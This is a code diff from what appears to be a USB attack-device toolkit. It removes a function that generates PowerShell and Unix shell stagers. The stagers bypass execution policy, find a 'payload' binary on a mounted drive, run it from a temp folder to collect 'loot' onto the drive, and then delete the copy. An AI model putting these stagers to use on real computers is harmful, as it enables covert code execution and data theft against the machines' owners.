@@ -1,7 +1,3 @@
-import type { TargetOs } from './types';
-
-const USB_WINDOWS_AGENT = 'payload.exe';
-const USB_UNIX_AGENT = 'payload.bin';
 const ALLOWED_BINARY_EXTENSIONS = new Set(['appimage', 'bin', 'elf', 'exe']);
 const BLOCKED_FILE_TYPES = new Set([
   'application/gzip',
@@ -73,38 +69,4 @@ export async function validateArmoryFile(file: File | null): Promise<string> {
   }
 
   return '';
-}
-
-export function stagerPreview(os: TargetOs): string {
-  if (os === 'windows') {
-    return [
-      'powershell -NoProfile -ExecutionPolicy Bypass',
-      '$r = ""',
-      'foreach ($drive in Get-PSDrive -PSProvider FileSystem) {',
-      `  $candidate = Join-Path $drive.Root '${USB_WINDOWS_AGENT}'`,
-      '  if (Test-Path $candidate) { $r = $drive.Root; break }',
-      '}',
-      'if ($r) {',
-      `  $s = Join-Path $r '${USB_WINDOWS_AGENT}'`,
-      "  $loot = Join-Path $r 'loot-usb.json'",
-      "  $d = Join-Path $env:TEMP 'pico_agent.exe'",
-      '  Copy-Item $s $d -Force',
-      '  & $d --loot-out $loot',
-      '  Remove-Item $d -Force -ErrorAction SilentlyContinue',
-      '}',
-    ].join('\n');
-  }
-
-  const roots = os === 'macos' ? '/Volumes/*' : '/media/$USER/* /run/media/$USER/* /mnt/*';
-  return [
-    `for d in ${roots}; do`,
-    `  if [ -f "$d/${USB_UNIX_AGENT}" ]; then`,
-    `    cp "$d/${USB_UNIX_AGENT}" /tmp/pico_agent`,
-    '    chmod +x /tmp/pico_agent',
-    '    /tmp/pico_agent --loot-out "$d/loot-usb.json"',
-    '    rm -f /tmp/pico_agent',
-    '    break',
-    '  fi',
-    'done',
-  ].join('\n');
 }
